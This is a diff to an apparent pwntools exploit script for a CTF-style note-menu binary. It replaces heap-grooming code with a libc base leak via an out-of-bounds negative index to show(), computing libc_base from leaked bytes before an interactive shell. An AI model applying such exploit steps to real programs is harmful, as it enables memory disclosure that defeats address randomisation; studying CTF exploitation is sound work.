@@ -31,17 +31,15 @@ def free(idx):
     p.sendafter(b" :", str(idx))
     print("=========== DEL_NOTE " + str(i) + " ===========")
 
+##################
+# LEAK_LIBC_BASE #
+##################
+
 note_ptr = 0x804a060
-
-for i in range(9):
-    add(i, str(i)*0x40)
-    
-
-for i in range(8):
-   free(i)
-
-add(8, b"A"*0x50)
-#show(8)
+show(-797)
+p.recvuntil(b"Name : ")
+libc_base = int.from_bytes(p.recv(4), "little") - 332880
+print("[+]Libc_base:    ", hex(libc_base))
 
 
 p.interactive()
